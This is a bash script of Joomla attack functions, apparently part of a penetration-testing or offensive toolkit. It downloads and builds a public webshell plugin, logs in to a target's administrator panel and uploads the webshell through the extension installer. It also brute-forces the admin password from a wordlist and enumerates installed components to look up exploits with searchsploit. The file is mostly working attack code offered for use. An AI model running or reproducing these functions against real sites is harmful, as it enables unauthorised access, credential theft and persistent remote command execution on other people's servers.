#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")


create_joomla_extension() {
    local url="https://github.com/p0dalirius/Joomla-webshell-plugin/archive/refs/heads/master.zip"
    local extension_dir="joomla_webshell"
    if [[ ! -d "$extension_dir" ]]; then
        wget "$url" -O "$extension_dir.zip" >> $trail_log
        unzip "$extension_dir.zip" -d .
        mv Joomla-webshell-plugin-master "$extension_dir"
        rm "$extension_dir.zip"
    fi
    pushd "$extension_dir" || return 1
    make
    popd || return 1    
    
}

login_joomla() {
    if [[ -z $target_joomla ]]; then
        echo "target_joomla is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    target_url="$target_joomla/administrator/index.php"
    cookie_jar="joomla_cookies.txt"
    if [[ -f $cookie_jar ]]; then
        rm $cookie_jar
    fi
    local hidden_inputs=$(get_post_hidden_inputs)
    local post_data="username=$username&passwd=$password&$hidden_inputs"
    response=$(curl -L -b $cookie_jar -c $cookie_jar -s -d "$post_data" "$target_url" --proxy localhost:8080)
    if [[ -z $response ]]; then
        echo "No response from server."
        return 1
    fi
    if [[ $response == *"Username and password do not match"* ]]; then  
        echo "Login failed for $username:$password"
        return 1
    else
        echo "Login successful for $username:$password"
        return 0
    fi

}

upload_joomla_extension() {
    if [[ -z $target_joomla ]]; then
        echo "target_joomla is not set"
        return 1
    fi
    target_url="$target_joomla/administrator/index.php?option=com_installer&view=install"
    #curl -b $cookie_jar -c $cookie_jar -s "$target_url" --proxy localhost:8080 > /dev/null
    proxy_option="--proxy localhost:8080"
    local hidden_inputs=$(get_iis_hidden_inputs)
    if [[ -z $hidden_inputs ]]; then
        echo "Could not retrieve hidden inputs for Joomla extension upload."
        return 1
    else
        echo $hidden_inputs
    fi
    webshell_location="joomla_webshell/dist/joomla-webshell-plugin-1.1.0.zip"
    if [[ -f $webshell_location ]]; then
        echo "Uploading Joomla extension..."
        other_form_data="-F install_directory=/var/www/html/joomla/tmp -F install_url= -F installtype=upload"
        response=$(curl -L -b $cookie_jar -c $cookie_jar -s -F "install_package=@$webshell_location;type=application/zip" $hidden_inputs $other_form_data "$target_url" --proxy localhost:8080)
        if [[ $response == *"Installation of the module was successful"* ]]; then
            echo "Joomla extension uploaded successfully."
            return 0
        else
            echo "Failed to upload Joomla extension."
            return 1
        fi
    else
        echo "Joomla extension file not found."
        return 1
    fi

}

joomla_brute() {
    if [[ -z $target_joomla ]]; then
        echo "target_joomla is not set"
        return 1
    fi
    target_url="http://$target_joomla/administrator/index.php"
    local hidden_inputs=""
    if [[ -z $username ]]; then
        username="admin"
    fi
    local password_file="passwords.txt"
    cookie_jar="joomla_cookies.txt"
    while read -r password; do
        #echo "Trying password: $password"
        hidden_inputs=$(get_post_hidden_inputs)
        #echo "Hidden inputs: $hidden_inputs"
        post_data="username=$username&passwd=$password&$hidden_inputs"
        #echo $target_url
        local response=$(curl -L -b $cookie_jar -c $cookie_jar -s -d "$post_data" "$target_url" )
        if [[ -z $response ]]; then
            echo "No response from server."
            echo "Last tried username: $username Password: $password"
            return 1
        fi
        if [[ $response == *"Username and password do not match"* ]]; then
            continue
        else
            echo "Successful login! Username: $username Password: $password"
            return 0
        fi
    done < "$password_file"
    echo "Brute-force attack failed."
    return 1    
}

searchsploit_joomla() {
    if [[ -z $target_joomla ]]; then
        echo "target_joomla is not set"
        return 1
    fi
    local url="http://$target_joomla/administrator/components/"
    response=$(curl -s "$url")
    components=$(echo "$response" | grep com | grep -oP 'href="\K[^"/]+' )
    for component in $components; do
        echo "Searching exploits for component: $component"
        searchsploit "Joomla $component"
    done

}